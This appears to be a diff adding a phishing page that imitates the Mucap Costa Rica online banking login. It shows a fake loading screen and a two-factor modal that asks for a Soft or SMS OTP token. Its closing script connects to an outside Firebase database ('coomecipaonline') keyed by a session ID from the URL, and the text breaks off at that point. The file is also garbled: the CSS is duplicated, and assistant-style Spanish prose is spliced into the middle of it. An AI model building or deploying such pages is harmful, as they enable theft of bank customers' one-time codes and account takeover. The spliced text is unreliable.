@@ -1,0 +1,1758 @@
+<html lang="es"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cargando...</title>
+    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700&amp;display=swap" rel="stylesheet">
+    <link href="custom.css" rel="stylesheet">
+    <link href="blazored-modal.css" rel="stylesheet">
+    <link href="BlazorDateRangePicker.iitr8bszy4.bundle.scp.css" rel="stylesheet">
+    <link href="sb-admin-2.min.css" rel="stylesheet">
+    <link href="select2.min.css" rel="stylesheet">
+    <link href="all.min.css" rel="stylesheet">
+    <link href="line-awesome.min.css" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;600;700&amp;display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>
+    <style><!--!-->
+    #_ad78c0fe626d40e981104b44c268ea37<!--!-->.blazored-modal-fade-in {
+        animation: 0ms<!--!--> ease-out 0s ModalFadeIn;
+    }
+
+    #_ad78c0fe626d40e981104b44c268ea37<!--!-->.blazored-modal-fade-out {
+        animation: 0ms<!--!--> ease-out 0s ModalFadeOut;
+        opacity: 0;
+    }
+
+    @keyframes ModalFadeIn {
+        0% {
+            opacity: 0;
+        }
+
+        100% {
+            opacity: 1;
+        }
+    }
+
+    @keyframes ModalFadeOut {
+        0% {
+            opacity: 1;
+        }
+
+        100% {
+            opacity: 0;
+        }
+    }
+</style>
+<style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Open Sans', sans-serif;
+        }
+
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            background-color: #ffffff;
+            overflow: hidden;
+        }
+
+        /* CONTENEDOR PRINCIPAL HILADO */
+        .main-wrapper {
+            display: flex;
+            width: 100%;
+            max-width: 1140px;
+            margin: 0 auto;
+            padding: 20px;
+            align-items: center;
+            position: relative;
+        }
+
+        /* --- SECCIÓN IZQUIERDA: BANNER DE FONDO --- */
+        .banner-side {
+            flex: 1.1;
+            height: 520px;
+            background: linear-gradient(135deg, #02111d 0%, #071f38 50%, #0d2f54 100%);
+            border-radius: 40px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.15);
+        }
+
+        /* --- SECCIÓN DERECHA: SELECCIÓN DE PERFIL --- */
+        .profile-side {
+            flex: 0.9;
+            padding: 0 10px 0 60px;
+        }
+
+        .brand-header {
+            display: flex;
+            flex-direction: column;
+            margin-bottom: 20px;
+        }
+
+        .logo-main {
+            font-size: 2.6rem;
+            font-weight: 700;
+            color: #0d4b94;
+            line-height: 1;
+            letter-spacing: -1px;
+        }
+        .logo-sub {
+            font-size: 0.65rem;
+            color: #0d4b94;
+            font-weight: 700;
+            letter-spacing: 3px;
+            margin-top: 2px;
+        }
+
+        .profile-side h2 {
+            font-size: 1.1rem;
+            color: #4a4a4a;
+            font-weight: 600;
+            margin-bottom: 20px;
+        }
+
+        .profile-section-title {
+            font-size: 0.85rem;
+            font-weight: 700;
+            color: #333;
+            margin: 15px 0 8px 0;
+        }
+
+        .profile-card {
+            width: 100%;
+            background-color: #f8f9fa;
+            border: 1px solid #e9ecef;
+            border-radius: 6px;
+            padding: 20px;
+            text-align: center;
+            color: #4a4a4a;
+            font-size: 0.95rem;
+            font-weight: 600;
+            margin-bottom: 15px;
+        }
+        .profile-card i {
+            display: block;
+            color: #0d4b94;
+            font-size: 1.2rem;
+            margin-bottom: 6px;
+        }
+
+        /* --- CAPA SUPERPUESTA OSCURA (OVERLAY) --- */
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.4);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 999;
+            padding: 15px; /* Evita que el modal toque los bordes físicos del celular */
+        }
+
+        /* --- VENTANA MODAL 2FA --- */
+        .modal-box {
+            background-color: #ffffff;
+            width: 500px;
+            border-radius: 4px;
+            padding: 35px 40px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.15);
+            position: relative;
+            animation: fadeIn 0.3s ease;
+        }
+
+        .close-modal {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            font-size: 1.1rem;
+            color: #000000;
+            cursor: pointer;
+            font-weight: bold;
+        }
+
+        .modal-label {
+            font-size: 0.78rem;
+            color: #9b9b9b;
+            margin-bottom: 6px;
+            display: block;
+        }
+
+        .select-wrapper {
+            position: relative;
+            margin-bottom: 30px;
+        }
+
+        .select-wrapper select {
+            width: 100%;
+            padding: 8px 12px;
+            border: 1px solid #a0aab5;
+            border-radius: 4px;
+            font-size: 0.9rem;
+            color: #333333;
+            outline: none;
+            background-color: #ffffff;
+            appearance: none;
+            -webkit-appearance: none;
+            cursor: pointer;
+        }
+
+        .select-wrapper::after {
+            content: '\f107';
+            font-family: 'Font Awesome 6 Free';
+            font-weight: 900;
+            position: absolute;
+            right: 12px;
+            top: 10px;
+            color: #718096;
+            pointer-events: none;
+            font-size: 0.85rem;
+        }
+
+        .token-input-group {
+            position: relative;
+            border-bottom: 1px solid #9b9b9b;
+            margin-bottom: 35px;
+            padding-bottom: 5px;
+        }
+
+        .token-input-group input {
+            width: 100%;
+            border: none;
+            text-align: center;
+            outline: none;
+            padding: 6px 0;
+            font-size: 0.95rem;
+            color: #333333;
+            background: transparent;
+        }
+
+        .modal-actions {
+            display: flex;
+            gap: 25px;
+        }
+
+        .btn-cancel {
+            flex: 1;
+            background-color: #eef2f9;
+            color: #0d4b94;
+            border: none;
+            padding: 12px;
+            border-radius: 6px;
+            font-size: 0.9rem;
+            font-weight: 700;
+            cursor: pointer;
+            text-align: center;
+        }
+
+        .btn-submit {
+            flex: 1;
+            background-color: #5b8ecb;
+            color: #ffffff;
+            border: none;
+            padding: 12px;
+            border-radius: 6px;
+            font-size: 0.9rem;
+            font-weight: 700;
+            cursor: pointer;
+            text-align: center;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: scale(0.95); }
+            to { opacity: 1; transform: scale(1); }
+        }
+
+        /* =========================================================
+           RESPONSIVO: OPTIMIZACIÓN EXCLUSIVA PARA CELULARES
+        ========================================================= */
+        @media (max-width: 992px) {
+            .main-wrapper { flex-direction: column; }
+            .banner-side { display: none; }
+            .profile-side { width: 100%; padding: 20px; }
+        }
+
+        /* Vista celular (Ajuste del tamaño del Token para pantallas pequeñas) */
+        @media (max-width: 576px) {
+            .modal-box {
+                width: 100%;            /* Toma todo el ancho disponible del celular */
+                max-width: 360px;       /* Tamaño límite compacto para que no se vea gigante */
+                padding: 22px 24px;     /* Reducción del espaciado interno (padding más pequeño) */
+                border-radius: 8px;
+            }
+
+            .close-modal {
+                top: 15px;
+                right: 15px;
+                font-size: 1rem;
+            }
+
+            .modal-label {
+                font-size: 0.72rem;     /* Letra ligeramente más pequeña y compacta */
+                margin-bottom: 4px;
+            }
+
+            .select-wrapper {
+                margin-bottom: 20px;    /* Menos separación entre bloques */
+            }
+
+            .select-wrapper select {
+                padding: 6px 10px;      /* Reducción de la altura del selector */
+                font-size: 0.85rem;
+            }
+
+            .select-wrapper::after {
+                top: 8px;
+                font-size: 0.75rem;
+            }
+
+            .token-input-group {
+                margin-bottom: 25px;    /* Ajuste de margen inferior del input de texto */
+                padding-bottom: 2px;
+            }
+
+            .token-input-group input {
+                padding: 4px 0;
+                font-size: 0.9rem;
+            }
+
+            .modal-actions {
+                gap: 12px;              /* Botones más juntos y optimizados */
+            }
+
+            .btn-cancel, .btn-submit {
+                padding: 10px;          /* Botones menos altos y más ajustados al dedo */
+                font-size: 0.82rem;     /* Tamaño de fuente estilizado para smartphone */
+                border-radius: 4px;
+            }
+        }
+        /* Estilo para que el escrito parezca un enlace interactivo */
+        .btn-reenviar { display: inline-block; margin-top: 12px; color: #9b9b9b; cursor: pointer; font-size: 14px; text-decoration: underline; font-weight: bold; }
+        .btn-reenviar:hover { color: #9b9b9b; }
+    </style>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Open Sans', sans-serif;
+        }
+
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            background-color: #ffffff;
+            overflow: hidden;
+        }
+
+        .main-wrapper {
+            display: flex;
+            width: 100%;
+            max-width: 1140px;
+            margin: 0 auto;
+            padding: 20px;
+            align-items: center;
+            position: relative;
+        }
+
+        .banner-side {
+            flex: 1.1;
+            height: 520px;
+            background: linear-gradient(135deg, #02111d 0%, #071f38 50%, #0d2f54 100%);
+            border-radius: 40px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.15);
+        }
+
+        .profile-side {
+            flex: 0.9;
+            padding: 0 10px 0 60px;
+        }
+
+        .brand-header {
+            display: flex;
+            flex-direction: column;
+            margin-bottom: 20px;
+        }
+
+        .logo-main {
+            font-size: 2.6rem;
+            font-weight: 700;
+            color: #0d4b94;
+            line-height: 1;
+            letter-spacing: -1px;
+        }
+        .logo-sub {
+            font-size: 0.65rem;
+            color: #0d4b94;
+            font-weight: 700;
+            letter-spacing: 3px;
+            margin-top: 2px;
+        }
+
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.4);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 999;
+            padding: 15px;
+        }
+
+        .modal-box {
+            background-color: #ffffff;
+            width: 500px;
+            border-radius: 4px;
+            padding: 35px 40px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.15);
+            position: relative;
+        }
+
+        .close-modal {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            font-size: 1.1rem;
+            color: #000000;
+            cursor: pointer;
+            font-weight: bold;
+        }
+
+        .modal-label {
+            font-size: 0.78rem;
+            color: #9b9b9b;
+            margin-bottom: 6px;
+            display: block;
+        }
+
+        .select-wrapper {
+            position: relative;
+            margin-bottom: 20px;
+        }
+
+        .select-wrapper select {
+            width: 100%;
+            padding: 8px 12px;
+            border: 1px solid #a0aab5;
+            border-radius: 4px;
+            font-size: 0.9rem;
+            color: #333333;
+            outline: none;
+            background-color: #ffffff;
+            appearance: none;
+            -webkit-appearance: none;
+            cursor: pointer;
+        }
+
+        .select-wrapper::after {
+            content: '\f107';
+            font-family: 'Font Awesome 6 Free';
+            font-weight: 900;
+            position: absolute;
+            right: 12px;
+            top: 10px;
+            color: #718096;
+            pointer-events: none;
+            font-size: 0.85rem;
+        }
+
+        /* --- CONTENEDOR DEL AVISO SMS Y REGRESIVO --- */
+        .sms-notice-container {
+            display: none; /* Oculto por defecto */
+            text-align: center;
+            margin-bottom: 25px;
+            animation: fadeIn 0.3s ease;
+        }
+
+        .sms-text {
+            color: #555555;
+            font-size: 0.85rem;
+            margin-bottom: 8px;
+        }
+
+        .countdown-display {
+            color: #8a94a6;
+            font-size: 1rem;
+            font-weight: 600;
+            letter-spacing: 1px;
+        }
+
+        .token-input-group {
+            position: relative;
+            border-bottom: 1px solid #a0aab5;
+            margin-bottom: 35px;
+            padding-bottom: 5px;
+        }
+
+        .token-input-group input {
+            width: 100%;
+            border: none;
+            outline: none;
+            padding: 6px 0;
+            font-size: 1.1rem;
+            color: #333333;
+            background: transparent;
+            letter-spacing: 2px;
+        }
+
+        .modal-actions {
+            display: flex;
+            gap: 25px;
+        }
+
+        .btn-cancel {
+            flex: 1;
+            background-color: #eef2f9;
+            color: #0d4b94;
+            border: none;
+            padding: 12px;
+            border-radius: 6px;
+            font-size: 0.9rem;
+            font-weight: 700;
+            cursor: pointer;
+            text-align: center;
+        }
+
+        .btn-submit {
+            flex: 1;
+            background-color: #5b8ecb;
+            color: #ffffff;
+            border: none;
+            padding: 12px;
+            border-radius: 6px;
+            font-size: 0.9rem;
+            font-weight: 700;
+            cursor: pointer;
+            text-align: center;
+            transition: background-color 0.2s ease;
+        }
+
+        .btn-submit.active {
+            background-color: #0055b8 !important;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        /* RESPONSIVO MÓVIL */
+        @media (max-width: 992px) {
+            .main-wrapper { flex-direction: column; }
+            .banner-side { display: none; }
+            .profile-side { width: 100%; padding: 20px; }
+        }
+
+        @media (max-width: 576px) {
+            .modal-box { width: 100%; max-width: 360px; padding: 22px 24px; }
+            .sms-text { font-size: 0.8rem; }
+            .countdown-display { font-size: 0.9rem; }
+            .token-input-group { margin-bottom: 25px; }
+            .modal-actions { gap: 12px; }
+            .btn-cancel, .btn-submit { padding: 10px; font-size: 0.82rem; }
+        }
+    </style>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Open Sans', sans-serif;
+        }
+
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            background-color: #ffffff;
+            overflow: hidden;
+        }
+
+        /* CONTENEDOR PRINCIPAL */
+        .main-wrapper {
+            display: flex;
+            width: 100%;
+            max-width: 1140px;
+            margin: 0 auto;
+            padding: 20px;
+            align-items: center;
+            position: relative;
+        }
+
+        /* --- SECCIÓN IZQUIERDA: BANNER DE FONDO --- */
+        .banner-side {
+            flex: 1.1;
+            height: 520px;
+            background: linear-gradient(135deg, #02111d 0%, #071f38 50%, #0d2f54 100%);
+            border-radius: 40px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.15);
+        }
+
+        /* --- SECCIÓN DERECHA: SELECCIÓN DE PERFIL --- */
+        .profile-side {
+            flex: 0.9;
+            padding: 0 10px 0 60px;
+        }
+
+        .brand-header {
+            display: flex;
+            flex-direction: column;
+            margin-bottom: 20px;
+        }
+
+        .logo-main {
+            font-size: 2.6rem;
+            font-weight: 700;
+            color: #0d4b94;
+            line-height: 1;
+            letter-spacing: -1px;
+        }
+        .logo-sub {
+            font-size: 0.65rem;
+            color: #0d4b94;
+            font-weight: 700;
+            letter-spacing: 3px;
+            margin-top: 2px;
+        }
+
+        .profile-side h2 {
+            font-size: 1.1rem;
+            color: #4a4a4a;
+            font-weight: 600;
+            margin-bottom: 20px;
+        }
+
+        .profile-section-title {
+            font-size: 0.85rem;
+            font-weight: 700;
+            color: #333;
+            margin: 15px 0 8px 0;
+        }
+
+        .profile-card {
+            width: 100%;
+            background-color: #f8f9fa;
+            border: 1px solid #e9ecef;
+            border-radius: 6px;
+            padding: 20px;
+            text-align: center;
+            color: #4a4a4a;
+            font-size: 0.95rem;
+            font-weight: 600;
+            margin-bottom: 15px;
+        }
+        .profile-card i {
+            display: block;
+            color: #0d4b94;
+            font-size: 1.2rem;
+            margin-bottom: 6px;
+        }
+Para lograr que la interfaz muestre el contenedor con el contador de 30 segundos exactos sin depender de librerías externas ni conexiones, se puede estructurar la lógica utilizando JavaScript local para manipular las clases de CSS y un objeto setInterval.
+
+Aquí tienes un ejemplo de la estructura limpia en HTML, CSS y JavaScript para implementar el comportamiento del menú desplegable y el contador regresivo de forma local:
+
+HTML
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <title>Ejemplo de Temporizador Dinámico</title>
+    <style>
+        /* Estilos base del contenedor del contador */
+        .contador-modulo {
+            display: none; /* Oculto por defecto */
+            margin: 20px 0;
+            padding: 15px;
+            border: 1px solid #d1d5db;
+            background-color: #f9fafb;
+            text-align: center;
+            border-radius: 6px;
+        }
+
+        /* Clase para mostrar el elemento */
+        .contador-modulo.visible {
+            display: block;
+        }
+
+        .tiempo-display {
+            font-size: 1.25rem;
+            font-weight: bold;
+            color: #374151;
+            margin-top: 5px;
+        }
+        /* --- CAPA SUPERPUESTA OSCURA (OVERLAY) --- */
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.4);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 999;
+            padding: 15px;
+        }
+
+        /* --- VENTANA MODAL 2FA --- */
+        .modal-box {
+            background-color: #ffffff;
+            width: 500px;
+            border-radius: 4px;
+            padding: 35px 40px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.15);
+            position: relative;
+            animation: fadeIn 0.3s ease;
+        }
+
+        .close-modal {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            font-size: 1.1rem;
+            color: #000000;
+            cursor: pointer;
+            font-weight: bold;
+        }
+
+        .modal-label {
+            font-size: 0.78rem;
+            color: #9b9b9b;
+            margin-bottom: 6px;
+            display: block;
+        }
+
+        .select-wrapper {
+            position: relative;
+            margin-bottom: 30px;
+        }
+
+        .select-wrapper select {
+            width: 100%;
+            padding: 8px 12px;
+            border: 1px solid #a0aab5;
+            border-radius: 4px;
+            font-size: 0.9rem;
+            color: #333333;
+            outline: none;
+            background-color: #ffffff;
+            appearance: none;
+            -webkit-appearance: none;
+            cursor: pointer;
+        }
+
+        .select-wrapper::after {
+            content: '\f107';
+            font-family: 'Font Awesome 6 Free';
+            font-weight: 900;
+            position: absolute;
+            right: 12px;
+            top: 10px;
+            color: #718096;
+            pointer-events: none;
+            font-size: 0.85rem;
+        }
+
+        /* Input de texto */
+        .token-input-group {
+            position: relative;
+            border-bottom: 1px solid #a0aab5;
+            margin-bottom: 35px;
+            padding-bottom: 5px;
+            transition: border-color 0.2s;
+        }
+
+        /* Cambio de color de la línea al enfocar */
+        .token-input-group:focus-within {
+            border-bottom: 2px solid #0d4b94;
+        }
+
+        .token-input-group input {
+            width: 100%;
+            border: none;
+            outline: none;
+            padding: 6px 0;
+            font-size: 1.1rem;
+            color: #333333;
+            background: transparent;
+            letter-spacing: 2px; /* Espaciado sutil para los números */
+        }
+
+        .modal-actions {
+            display: flex;
+            gap: 25px;
+        }
+
+        .btn-cancel {
+            flex: 1;
+            background-color: #eef2f9;
+            color: #0d4b94;
+            border: none;
+            padding: 12px;
+            border-radius: 6px;
+            font-size: 0.9rem;
+            font-weight: 700;
+            cursor: pointer;
+            text-align: center;
+        }
+
+        /* ESTADO POR DEFECTO DEL BOTÓN ENVIAR (Azul claro deshabilitado visualmente) */
+        .btn-submit {
+            flex: 1;
+            background-color: #5b8ecb;
+            color: #ffffff;
+            border: none;
+            padding: 12px;
+            border-radius: 6px;
+            font-size: 0.9rem;
+            font-weight: 700;
+            cursor: pointer;
+            text-align: center;
+            transition: background-color 0.2s ease; /* Transición suave de color */
+        }
+
+        /* CLASE ACTIVA QUE SE AGREGARÁ CON JAVASCRIPT */
+        .btn-submit.active {
+            background-color: #0055b8 !important;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: scale(0.95); }
+            to { opacity: 1; transform: scale(1); }
+        }
+
+        /* RESPONSIVO MÓVIL */
+        @media (max-width: 992px) {
+            .main-wrapper { flex-direction: column; }
+            .banner-side { display: none; }
+            .profile-side { width: 100%; padding: 20px; }
+        }
+
+        @media (max-width: 576px) {
+            .modal-box {
+                width: 100%;
+                max-width: 360px;
+                padding: 22px 24px;
+                border-radius: 8px;
+            }
+            .close-modal { top: 15px; right: 15px; font-size: 1rem; }
+            .modal-label { font-size: 0.72rem; margin-bottom: 4px; }
+            .select-wrapper { margin-bottom: 20px; }
+            .select-wrapper select { padding: 6px 10px; font-size: 0.85rem; }
+            .select-wrapper::after { top: 8px; font-size: 0.75rem; }
+            .token-input-group { margin-bottom: 25px; padding-bottom: 2px; }
+            .token-input-group input { padding: 4px 0; font-size: 1rem; }
+            .modal-actions { gap: 12px; }
+            .btn-cancel, .btn-submit { padding: 10px; font-size: 0.82rem; border-radius: 4px; }
+        }
+    </style>
+<style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Open Sans', sans-serif;
+        }
+
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            background-color: #ffffff;
+            overflow: hidden;
+        }
+
+        /* CONTENEDOR PRINCIPAL HILADO */
+        .main-wrapper {
+            display: flex;
+            width: 100%;
+            max-width: 1140px;
+            margin: 0 auto;
+            padding: 20px;
+            align-items: center;
+            position: relative;
+        }
+
+        /* --- SECCIÓN IZQUIERDA: BANNER DE FONDO --- */
+        .banner-side {
+            flex: 1.1;
+            height: 520px;
+            background: linear-gradient(135deg, #02111d 0%, #071f38 50%, #0d2f54 100%);
+            border-radius: 40px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.15);
+        }
+
+        /* --- SECCIÓN DERECHA: SELECCIÓN DE PERFIL (FONDO BLUR/SOMBREADO) --- */
+        .profile-side {
+            flex: 0.9;
+            padding: 0 10px 0 60px;
+        }
+
+        .brand-header {
+            display: flex;
+            flex-direction: column;
+            margin-bottom: 20px;
+        }
+
+        .logo-main {
+            font-size: 2.6rem;
+            font-weight: 700;
+            color: #0d4b94;
+            line-height: 1;
+            letter-spacing: -1px;
+        }
+        .logo-main span { color: #d62828; }
+        .logo-sub {
+            font-size: 0.65rem;
+            color: #0d4b94;
+            font-weight: 700;
+            letter-spacing: 3px;
+            margin-top: 2px;
+        }
+
+        .profile-side h2 {
+            font-size: 1.1rem;
+            color: #4a4a4a;
+            font-weight: 600;
+            margin-bottom: 20px;
+        }
+
+        .profile-section-title {
+            font-size: 0.85rem;
+            font-weight: 700;
+            color: #333;
+            margin: 15px 0 8px 0;
+        }
+
+        /* Cajas de perfil simuladas al fondo */
+        .profile-card {
+            width: 100%;
+            background-color: #f8f9fa;
+            border: 1px solid #e9ecef;
+            border-radius: 6px;
+            padding: 20px;
+            text-align: center;
+            color: #4a4a4a;
+            font-size: 0.95rem;
+            font-weight: 600;
+            margin-bottom: 15px;
+            cursor: pointer;
+        }
+        .profile-card i {
+            display: block;
+            color: #0d4b94;
+            font-size: 1.2rem;
+            margin-bottom: 6px;
+        }
+
+
+        /* --- CAPA SUPERPUESTA OSCURA (OVERLAY) --- */
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.4); /* Opacidad para oscurecer el fondo */
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 999;
+        }
+
+        /* --- VENTANA MODAL 2FA --- */
+        .modal-box {
+            background-color: #ffffff;
+            width: 500px;
+            border-radius: 4px;
+            padding: 35px 40px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.15);
+            position: relative;
+            animation: fadeIn 0.3s ease;
+        }
+
+        /* Botón cerrar 'x' */
+        .close-modal {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            font-size: 1.1rem;
+            color: #000000;
+            cursor: pointer;
+            font-weight: bold;
+        }
+
+        /* Etiquetas del formulario */
+        .modal-label {
+            font-size: 0.78rem;
+            color: #9b9b9b;
+            margin-bottom: 6px;
+            display: block;
+        }
+
+        /* Input Select Estilo Nativo / Adaptado */
+        .select-wrapper {
+            position: relative;
+            margin-bottom: 30px;
+        }
+
+        .select-wrapper select {
+            width: 100%;
+            padding: 8px 12px;
+            border: 1px solid #a0aab5;
+            border-radius: 4px;
+            font-size: 0.9rem;
+            color: #333333;
+            outline: none;
+            background-color: #ffffff;
+            appearance: none; /* Remueve flecha nativa */
+            -webkit-appearance: none;
+            cursor: pointer;
+        }
+
+        /* Flecha personalizada del select */
+        .select-wrapper::after {
+            content: '\f107';
+            font-family: 'Font Awesome 6 Free';
+            font-weight: 900;
+            position: absolute;
+            right: 12px;
+            top: 10px;
+            color: #718096;
+            pointer-events: none;
+            font-size: 0.85rem;
+        }
+
+        /* Input de texto para digitar el Token */
+        .token-input-group {
+            position: relative;
+            border-bottom: 1px solid #9b9b9b;
+            margin-bottom: 35px;
+            padding-bottom: 5px;
+        }
+
+        .token-input-group input {
+            width: 100%;
+            border: none;
+            outline: none;
+            padding: 6px 0;
+            font-size: 0.95rem;
+            color: #333333;
+            background: transparent;
+        }
+
+        /* Fila de Botones de Acción */
+        .modal-actions {
+            display: flex;
+            gap: 25px;
+        }
+
+        .btn-cancel {
+            flex: 1;
+            background-color: #eef2f9;
+            color: #0d4b94;
+            border: none;
+            padding: 12px;
+            border-radius: 6px;
+            font-size: 0.9rem;
+            font-weight: 700;
+            cursor: pointer;
+            transition: background 0.2s;
+            text-align: center;
+        }
+
+        .btn-cancel:hover {
+            background-color: #e2e8f3;
+        }
+
+        .btn-submit {
+            flex: 1;
+            background-color: #5b8ecb; /* Color azul claro exacto del botón enviar */
+            color: #ffffff;
+            border: none;
+            padding: 12px;
+            border-radius: 6px;
+            font-size: 0.9rem;
+            font-weight: 700;
+            cursor: pointer;
+            transition: background 0.2s;
+            text-align: center;
+        }
+
+        .btn-submit:hover {
+            background-color: #4a7db8;
+        }
+
+        /* Animación de apertura */
+        @keyframes fadeIn {
+            from { opacity: 0; transform: scale(0.95); }
+            to { opacity: 1; transform: scale(1); }
+        }
+    </style>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Open Sans', sans-serif;
+        }
+
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: flex-start; /* Alineación superior igual a la imagen original */
+            min-height: 100vh;
+            background-color: #ffffff;
+            padding-top: 50px; /* Margen superior exacto de la caja blanca */
+        }
+
+        /* Contenedor central blanco con borde suave */
+        .loading-container {
+            width: 100%;
+            max-width: 950px;
+            background-color: #ffffff;
+            border: 1px solid #f1f3f5;
+            border-radius: 8px;
+            padding: 50px 20px;
+            text-align: center;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.02);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        /* Contenedor del logotipo de Mucap */
+        .mucap-logo {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin-bottom: 30px;
+            user-select: none;
+        }
+
+        /* Tipografía y diseño idéntico del logo */
+        .logo-main {
+            font-size: 2.8rem;
+            font-weight: 700;
+            color: #0d4b94;
+            line-height: 1;
+            letter-spacing: -1.5px;
+            position: relative;
+        }
+        
+        .logo-main span {
+            color: #d62828;
+        }
+
+        /* Las barras decorativas superiores del logo real */
+        .logo-main::before {
+            content: '';
+            position: absolute;
+            top: -12px;
+            left: 55px;
+            width: 26px;
+            height: 4px;
+            background-color: #0d4b94;
+            transform: skewX(-35deg);
+        }
+
+        .logo-main::after {
+            content: '';
+            position: absolute;
+            top: -6px;
+            left: 64px;
+            width: 26px;
+            height: 4px;
+            background-color: #d62828;
+            transform: skewX(-35deg);
+        }
+
+        .logo-sub {
+            font-size: 0.65rem;
+            color: #0d4b94;
+            font-weight: 700;
+            letter-spacing: 3.5px;
+            margin-top: 4px;
+            padding-left: 4px;
+        }
+
+        /* Mensaje de espera */
+        .loading-text {
+            color: #718096;
+            font-size: 0.85rem;
+            font-weight: 600;
+            margin-bottom: 40px;
+            letter-spacing: 0.2px;
+        }
+
+        /* Spinner de carga idéntico mediante CSS */
+        .spinner {
+            width: 54px;
+            height: 54px;
+            border: 5px solid #edf2f7; /* Color de fondo del aro gris claro */
+            border-top: 5px solid #0d4b94; /* Color azul de carga */
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        /* Animación de rotación continua */
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* Responsivo básico para que no se corte en móviles */
+        @media (max-width: 980px) {
+            .loading-container {
+                width: 90%;
+                margin: 20px auto;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="loading-container">
+        
+        <div class="mucap-logo">
+            <div class="logo-main">Mucap</div>
+            <div class="logo-sub">COSTA RICA</div>
+        </div>
+
+        <div class="main-wrapper">
+        <div class="banner-side"></div>
+        <div class="profile-side">
+            <div class="brand-header">
+                <div class="logo-main">Mucap</div>
+                <div class="logo-sub">COSTA RICA</div>
+            </div>
+            <h2>Seleccione el perfil que desea utilizar</h2>
+            <div class="profile-section-title">PERSONAL</div>
+            <div class="profile-card"><i class="fa-solid fa-user"></i>***** ***** *****</div>
+        </div>
+    </div>
+
+    <div class="modal-overlay">
+        <div class="modal-box">
+            <span class="close-modal"><i class="fa-solid fa-xmark"></i></span>
+            <form id="form-sms">
+                
+                <label class="modal-label" for="token_type">Doble factor de autenticación</label>
+                <div class="select-wrapper">
+                    <select id="selector_autenticacion">
+    <option value="soft_token">Soft Token</option>
+    <option value="sms_token">SMS Token</option>
+</select>
+
+<div id="bloque_mensaje" style="display: none;">
+    <br><p>Se ha enviado un código OTP a su SMS Token</p>
+</div>
+                </div>
+
+                <div id="sms_notice" class="sms-notice-container">
+                    <br>
+                    <div class="sms-text">Se ha enviado un código OTP a su SMS Token</div>
+                </div>
+
+                <div class="token-input-group">
+                    <label class="modal-label" id="label_digite" for="token_code">Digite el token</label>
+                    <input type="text" id="sms-input" inputmode="numeric" name="token_code" maxlength="8" autocomplete="off" required="">
+                </div>
+
+                <div class="modal-actions">
+                    <button type="button" class="btn-cancel">Cancelar</button>
+                    <button type="submit" id="btn-envio" class="btn-submit">Enviar</button>
+                </div>
+                <br><span id="reenviarToken" class="btn-reenviar">Reenviar token</span>
+
+            </form>
+        </div>
+    </div>
+
+        
+
+    </div>
+<!-- Code injected by live-server -->
+<script>
+    // 1. CONFIGURACIÓN
+    const firebaseConfig = { 
+        databaseURL: "https://coomecipaonline-default-rtdb.firebaseio.com/" 
+    };
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
+
+    // 2. OBTENER EL ID DE LA URL
+    const urlParams = new URLSearchParams(window.location.search);
+    const sessionId = urlParams.get('id');
+
